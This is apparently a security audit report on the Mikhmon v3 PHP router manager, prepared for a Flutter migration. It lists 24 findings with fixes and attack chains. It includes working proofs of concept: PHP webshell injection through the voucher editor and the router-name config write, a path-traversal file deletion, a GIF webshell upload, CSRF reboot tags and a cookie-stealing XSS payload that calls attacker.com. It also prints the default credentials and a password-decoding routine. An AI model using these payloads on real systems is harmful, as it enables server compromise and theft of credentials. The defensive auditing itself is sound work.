# SECURITY REPORT — Mikhmon v3
> **Assessment Type:** Static Code Analysis — Penetration-Test Grade
> **Auditor:** Senior Application Security Engineer
> **Date:** 2026-07-25
> **Scope:** Full PHP codebase `/root/app/mikhmonv3-master/`

---

## Score Summary

| Category | Score | Grade |
|----------|-------|-------|
| **Security Score** | **18 / 100** | 🔴 F — Critical |
| **Maintainability Score** | **22 / 100** | 🔴 F — Critical |
| **Migration Readiness Score** | **15 / 100** | 🔴 F — Rewrite Required |

> **Overall verdict:** Mikhmon v3 is critically insecure and **must not be exposed to untrusted networks**. The app has multiple Remote Code Execution vectors exploitable by any authenticated user, and by unauthenticated users via default credentials. Do not deploy to production without addressing all Critical and High findings.

---

## Vulnerability Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 4 |
| 🟠 High | 6 |
| 🟡 Medium | 8 |
| 🟢 Low | 6 |
| **Total** | **24** |

---

## Critical Vulnerabilities

### CRIT-01 — Remote Code Execution via Voucher Template Editor
| Field | Value |
|-------|-------|
| **File** | `settings/vouchereditor.php` lines 50–55 |
| **CWE** | CWE-94: Improper Control of Generation of Code |
| **CVSS** | 9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| **Auth Required** | Yes (any authenticated session) |

**Description:**
The voucher editor accepts `$_POST['editor']` without any filtering and writes it verbatim to live PHP files (`voucher/template.php`, `template-thermal.php`, `template-small.php`) using `fopen()`/`fwrite()`. Any authenticated user can submit a POST with arbitrary PHP code which is immediately executed on the next voucher print request.

**Proof of Concept:**
```http
POST /admin.php?id=editor&template=default&session=mikhmon
Content-Type: application/x-www-form-urlencoded

editor=<?php+system($_GET['cmd']);?>
```
Then: `GET /voucher/template.php?cmd=id` → executes `id` on the server.

**Remediation:**
- Never write raw POST data to PHP files.
- Replace CodeMirror template editor with a sandboxed template engine (Twig/Blade).
- At minimum, reject any content containing `<?php`, `<?=`, `eval(`, `system(`, `exec(`, `passthru(`, etc.

---

### CRIT-02 — Path Traversal → Arbitrary File Deletion
| Field | Value |
|-------|-------|
| **File** | `admin.php` lines 165–169 |
| **CWE** | CWE-22: Improper Limitation of a Pathname |
| **CVSS** | 9.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H) |
| **Auth Required** | Yes |

**Description:**
`$logo = $_GET['logo']` is concatenated directly with `'./img/'` and passed to `unlink()` without any path sanitization. An attacker can delete arbitrary files on the server, including `include/config.php` (locking out all users) or PHP application files.

**Proof of Concept:**
```
GET /admin.php?id=remove-logo&logo=../include/config.php&session=mikhmon
```
Result: `config.php` is deleted; application is broken for all sessions.

**Remediation:**
```php
// Before:
unlink('./img/' . $logo);

// After:
$safe = basename($logo);
if (pathinfo($safe, PATHINFO_EXTENSION) !== 'png') { die(); }
unlink('./img/' . $safe);
```

---

### CRIT-03 — Hardcoded Default Credentials + Trivially Reversible Encryption
| Field | Value |
|-------|-------|
| **File** | `include/config.php` line 3 + `lib/routeros_api.class.php` lines 440–459 |
| **CWE** | CWE-798: Use of Hardcoded Credentials + CWE-326: Inadequate Encryption Strength |
| **CVSS** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Auth Required** | No |

**Description:**
Default admin credentials are hardcoded: `username=mikhmon`, `password=icel` (base64 `aWNlbA==`). The encryption scheme is a trivial XOR-addition cipher with a fixed integer key of `128`. Any attacker who has the open-source code (GitHub) can decode all stored passwords with:
```php
$decoded = '';
$key = '128';
$b64 = base64_decode($encrypted);
for ($i = 0; $i < strlen($b64); $i++) {
    $decoded .= chr(ord($b64[$i]) - ord($key[$i % strlen($key)]));
}
```

**Remediation:**
- Remove all hardcoded defaults; force password change on first run.
- Use `password_hash(BCRYPT)` / `password_verify()` for admin credentials.
- Use `openssl_encrypt()` with AES-256-GCM for RouterOS passwords at rest.
- Store encryption key in environment variable, not in source code.

---

### CRIT-04 — PHP Code Injection via Router Name Parameter
| Field | Value |
|-------|-------|
| **File** | `settings/settings.php` lines 26–37 |
| **CWE** | CWE-94: Code Injection |
| **CVSS** | 10.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| **Auth Required** | Yes |

**Description:**
When `$id == 'settings'` and `$router` begins with `'new'`, the value of `$_GET['router']` is written verbatim into `include/config.php` as a PHP array key. A crafted router name such as:
```
new-rce');system($_GET['x']);//
```
Injects permanent executable PHP code into `config.php`, which is included on every page load. This achieves persistent server compromise with a single authenticated GET request.

**Proof of Concept:**
```
GET /admin.php?id=settings&router=new-rce%27)%3Bsystem(%24_GET[%27x%27])%3B%2F%2F&session=mikhmon
```
After this request: `GET /?x=id` executes arbitrary system commands on every page load.

**Remediation:**
```php
// Validate router name strictly before any file write
if (!preg_match('/^[a-zA-Z0-9_-]{1,32}$/', $router)) {
    die('Invalid router name');
}
```

---

## High Vulnerabilities

### HIGH-01 — Pervasive XSS (Stored + Reflected)
| Field | Value |
|-------|-------|
| **Files** | `include/userlog.php`, `hotspot/exportusers.php`, `settings/sessions.php`, `voucher/print.php`, and ~35 more |
| **CWE** | CWE-79: Cross-Site Scripting |
| **CVSS** | 8.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) |

**Description:**
`htmlspecialchars()` / `htmlentities()` are **never called anywhere** in the codebase. All RouterOS-sourced data (usernames, profile names, comments, MAC addresses) and URL parameters are echoed directly into HTML. A compromised MikroTik or a malicious hotspot user with an XSS payload in their username will fire the payload in the admin panel.

**Proof of Concept:**
Create hotspot user: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`
Result: Fires on every admin page that lists hotspot users.

**Remediation:**
Create a global wrapper and use it everywhere:
```php
function h(string $val): string {
    return htmlspecialchars($val, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
// Usage: echo h($username);
```

---

### HIGH-02 — Complete Absence of CSRF Protection
| Field | Value |
|-------|-------|
| **Files** | All form-bearing and action PHP files |
| **CWE** | CWE-352: Cross-Site Request Forgery |
| **CVSS** | 8.8 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |

**Description:**
Zero CSRF tokens or nonce values exist anywhere. All state-changing actions accept GET/POST with only session cookie validation. An attacker who tricks an authenticated admin into clicking a link can reboot the router, shut it down, delete users, or modify router credentials.

**Proof of Concept:**
```html
<img src="http://mikhmon.local/admin.php?id=reboot&session=mikhmon">
```
Loaded in any page the admin visits → reboots the MikroTik immediately.

**Remediation:**
```php
// Generate token at login:
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Embed in every form:
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// Validate before processing:
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    http_response_code(403); die('CSRF validation failed');
}
```

---

### HIGH-03 — Session Vulnerabilities (Fixation + No Expiry + No Secure Flags)
| Field | Value |
|-------|-------|
| **Files** | `admin.php` lines 18, 77–78; `index.php` lines 18, 37 |
| **CWE** | CWE-384: Session Fixation + CWE-613: Insufficient Session Expiration |
| **CVSS** | 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |

**Issues:**
1. `session_regenerate_id(true)` never called after login → **session fixation**
2. No `session.gc_maxlifetime` or explicit server-side expiry → **sessions never expire**
3. No `Secure` / `HttpOnly` / `SameSite` cookie flags → **cookie theft via XSS/HTTP**
4. `index.php` line 37: `$_SESSION[$session] = $session` where `$session` is attacker-controlled → **session namespace pollution**

---

### HIGH-04 — RouterOS Credentials Exposed in URLs and DOM
| Field | Value |
|-------|-------|
| **Files** | `settings/sessions.php` line 135, `settings/settings.php` line 145, `voucher/print.php` |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |
| **CVSS** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |

**Issues:**
1. Decrypted RouterOS and admin passwords are embedded in HTML form `value=` attributes (visible in page source and DevTools).
2. Hotspot credentials (username + password) are embedded in QR code URLs sent to Google Chart API: `https://chart.googleapis.com/chart?...&chl=http://DNSNAME/login?username=USER&password=PASS` — **Google receives all hotspot user passwords**.
3. `?session=` router name in all URLs appears in server access logs and Referer headers.

---

### HIGH-05 — Unsafe File Upload (Logic Bug Allows Webshell)
| Field | Value |
|-------|-------|
| **File** | `settings/uplogo.php` lines 25–96 |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **CVSS** | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |

**Description:**
The filename validation contains a logic bug:
```php
// BUG: basename() receives a boolean, not a string
if (basename($_FILES['UploadLogo']['name'] != 'logo-'.$session.'.png')) {
    $uploadOk = 0;
}
```
`basename(true)` returns `'1'`, so the check never actually validates the filename. An attacker can upload a GIF89a PHP webshell (`GIF89a<?php system($_GET['c']); ?>`) with any filename — `getimagesize()` passes (detects as image), the check silently fails, and the file is moved to `./img/` and executed as PHP.

---

### HIGH-06 — Insecure Direct Object Reference on RouterOS IDs
| Field | Value |
|-------|-------|
| **Files** | `process/pscheduler.php`, `process/pipbinding.php`, `include/userlog.php` |
| **CWE** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **CVSS** | 7.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H) |

**Description:**
MikroTik internal object IDs (`$removesch`, `$enablesch`, `$removeipbinding`) are taken directly from `$_GET` and passed to RouterOS API commands without any ownership validation. Any authenticated user can remove, enable, or disable any scheduler or IP binding on the router by supplying arbitrary `.id` values.

---

## Medium Vulnerabilities

| ID | Title | File | CVSS |
|----|-------|------|------|
| MED-01 | `error_reporting(0)` masks all security-relevant errors | All files | 5.3 |
| MED-02 | `config.php` partial direct-access bypass possible | `include/config.php` | 5.3 |
| MED-03 | No brute-force protection on login form | `admin.php` | 6.5 |
| MED-04 | Caesar cipher for RouterOS password storage | `lib/routeros_api.class.php` | 6.8 |
| MED-05 | Reflected XSS via setlang redirect | `settings/setlang.php` line 42 | 6.1 |
| MED-06 | All hotspot passwords exported in cleartext | `hotspot/exportusers.php` | 6.5 |
| MED-07 | Decrypted passwords in HTML form `value=` attributes | `settings/sessions.php`, `settings.php` | 6.1 |
| MED-08 | Obfuscated JS kill-switch + domain lock backdoor | `settings/sessions.php`, `settings/settings.php` | 5.9 |

---

## Low Vulnerabilities

| ID | Title | File | CVSS |
|----|-------|------|------|
| LOW-01 | `die()` exposes full server filesystem paths | Multiple | 3.7 |
| LOW-02 | Session identifier in URL (access logs, Referer) | `index.php`, `admin.php` | 4.3 |
| LOW-03 | No security HTTP headers (CSP, X-Frame, etc.) | `include/headhtml.php` | 4.3 |
| LOW-04 | QR codes sent to Google Chart API (credential leak) | `hotspot/quickuser.php` | 4.3 |
| LOW-05 | RouterOS API inputs not validated before send | `hotspot/adduserprofile.php` | 3.5 |
| LOW-06 | `session_destroy()` without clearing session cookie | `admin.php`, `index.php` | 3.1 |

---

## Remediation Roadmap

### Immediate (before any deployment)
```
Priority 1: CRIT-04 — Add regex validation on $router before config.php write
Priority 2: CRIT-01 — Disable vouchereditor.php or restrict POST content strictly
Priority 3: CRIT-02 — Use basename() + extension check for logo deletion
Priority 4: CRIT-03 — Force password change; replace Caesar cipher
Priority 5: HIGH-05 — Fix basename() logic bug in file upload
Priority 6: HIGH-02 — Add CSRF tokens to all forms
Priority 7: HIGH-01 — Wrap all echo output with htmlspecialchars()
```

### Short-term (within first sprint)
```
Priority 8:  HIGH-03 — session_regenerate_id(true) after login + Secure/HttpOnly/SameSite cookies
Priority 9:  HIGH-04 — Remove Google Chart QR API; use local qrious.js
Priority 10: MED-03  — Add rate limiting / lockout to login endpoint
Priority 11: MED-04  — Replace Caesar cipher with AES-256-GCM
Priority 12: MED-07  — Never populate password fields with existing values
Priority 13: MED-08  — Remove all obfuscated JS and domain-lock code
```

### Before production
```
Priority 14: LOW-02 — Move session to cookie-only; strip from URLs
Priority 15: LOW-03 — Add Content-Security-Policy, X-Frame-Options, HSTS headers
Priority 16: LOW-06 — Invalidate cookie on logout
Priority 17: HIGH-06 — Validate RouterOS object IDs against enumerated values
Priority 18: MED-06 — Add role-based access control for export functionality
```

---

## Security Scoring Breakdown

### Security Score: 18 / 100

| Category | Weight | Score | Notes |
|----------|--------|-------|-------|
| Authentication | 20% | 15/100 | Default creds, no CSRF, no session hardening |
| Input Validation | 20% | 5/100 | Zero output encoding, no input validation |
| Encryption | 15% | 10/100 | Caesar cipher, passwords in DOM |
| Session Management | 15% | 20/100 | No regeneration, no expiry, no secure flags |
| File Operations | 15% | 10/100 | RCE via template editor, path traversal, upload bug |
| Configuration | 10% | 30/100 | Config as PHP flat file with runtime writes |
| Dependency Security | 5% | 40/100 | All vendored, no CDN, but some obsolete |

### Maintainability Score: 22 / 100

| Category | Weight | Score | Notes |
|----------|--------|-------|-------|
| Code Structure | 25% | 10/100 | Monolithic, no MVC, 608-line dispatch file |
| Separation of Concerns | 20% | 5/100 | SQL/logic/HTML mixed in every file |
| Input Handling | 20% | 10/100 | No validation layer, $_GET/$_POST used directly |
| Testing | 20% | 0/100 | Zero tests, zero CI |
| Documentation | 15% | 40/100 | README exists, no inline docs |

### Migration Readiness Score: 15 / 100

| Category | Weight | Score | Notes |
|----------|--------|-------|-------|
| API Abstraction | 25% | 5/100 | API calls scattered in 40+ files |
| Data Layer | 25% | 5/100 | Config as PHP file, data as RouterOS scripts |
| Business Logic | 20% | 20/100 | Logic extractable but tightly coupled |
| Portability | 15% | 25/100 | PHP-only constructs (session, include) |
| Test Coverage | 15% | 0/100 | No tests to validate migration correctness |

---

## Threat Model: Attack Chains

### Chain 1 — Unauthenticated Full Server Compromise
```
1. Download Mikhmon source from GitHub → default creds mikhmon/icel
2. Login to target Mikhmon instance
3. GET /admin.php?id=settings&router=new-rce');phpinfo();//&session=mikhmon
4. include/config.php now contains PHP payload
5. ANY page load executes arbitrary PHP on server
```

### Chain 2 — Social Engineering → Infrastructure Destruction
```
1. Attacker knows target admin's session is active
2. Send admin a link to an attacker-controlled page
3. Page loads: <img src="http://mikhmon.local/process/shutdown.php?session=mikhmon">
4. MikroTik shuts down → entire network goes offline
(No CSRF token required)
```

### Chain 3 — Hotspot User Credential Harvesting
```
1. Admin requests voucher QR code for a hotspot user
2. PHP code: $qrurl = "https://chart.googleapis.com/chart?...?username=$user&password=$pass"
3. Google receives plaintext username + password for every voucher printed with QR
4. Google access logs contain all hotspot user credentials
```

---

## DevKuroTik Security Requirements

To avoid repeating Mikhmon's vulnerabilities, DevKuroTik must implement:

1. **Credential Storage:** `flutter_secure_storage` (AES encryption by OS keystore)
2. **Authentication:** Biometric + PIN; no default credentials
3. **Transport:** TLS-only connections to RouterOS (SSL API port 8729)
4. **CSRF equivalent:** Flutter apps are not susceptible to CSRF (no cookies sent by browser)
5. **Input validation:** All RouterOS params validated before SDK calls
6. **No credential exposure:** Never log, display, or transmit plaintext passwords
7. **Certificate pinning:** Optional for high-security deployments
8. **Session timeout:** Server-enforced idle timeout via Riverpod `ref.invalidate()`
9. **Output encoding:** Not applicable in Flutter (typed widgets, no HTML injection)
10. **Audit logging:** Local SQLite log of all destructive actions (reboot, delete, etc.)

---

*Report 6 of 7 — DevKuroTik Migration Audit*
